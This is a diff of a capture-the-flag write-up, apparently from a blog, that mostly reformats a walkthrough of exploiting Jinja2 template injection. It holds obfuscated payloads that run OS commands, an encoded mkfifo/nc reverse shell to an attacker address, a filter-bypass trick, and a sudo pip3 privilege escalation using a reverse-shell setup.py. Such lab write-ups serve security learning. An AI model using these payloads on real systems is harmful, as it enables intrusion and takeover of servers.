@@ -32,13 +32,15 @@ On enumerating we found that if we enter any wrong directory in the url we can s
 ![](/images/D4rkDemian/dotpy3.png)
 
 
-So we guessed it would be template injection and confirmed it by entering **{{7*7}}**.
+So we guessed it would be template injection and confirmed it by entering {{7*7}}.
 
 
 So now we found an exploit command which will find the os library within the running machine and let us run our commands like **id** , **ls** etc..
 
 
-```{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}```
+```py
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
 
 This worked and we got our output.
 
@@ -53,15 +55,16 @@ Now the exploit looks as follows
 ```py
 /%7B%7Brequest|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen'
 ('rm\x20\x2Ftmp\x2Ff\x3Bmkfifo\x20\x2Ftmp\x2Ff\x3Bcat\x20\x2Ftmp\x2Ff\x7Cbash\x20\x2Di\x202\x3E\x261\x7Cnc\x2010\x2E8\x2E7\x2E41\x201337\x20\x3E\x2Ftmp\x2Ff')|attr('read')()%7D%7D
+
 ```
 
-We replaced the percent sign with **\x** and . with **\x2E** as they were getting blocked by the website.
+We replaced the percent sign with \x and . with \x2E as they were getting blocked by the website.
 
 And so we got our shell 
 
 Lets send socat to the shell to make it more stabilized..
 
-After doing `sudo -l` we found that user web had the permission to run /usr/bin/pip3 as system-adm user .
+After doing sudo -l we found that user web had the permission to run /usr/bin/pip3 as system-adm user .
 
 
 So we created a setup.py file and placed the python reverse shell in it 
@@ -74,7 +77,9 @@ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 
 Now listen on your local machine and run the following command in the shell 
 
-```sudo -u system-adm /usr/bin/pip3 install /tmp/shell```
+```shell
+sudo -u system-adm /usr/bin/pip3 install /tmp/shell
+```
 
 And now we are system-adm 
 
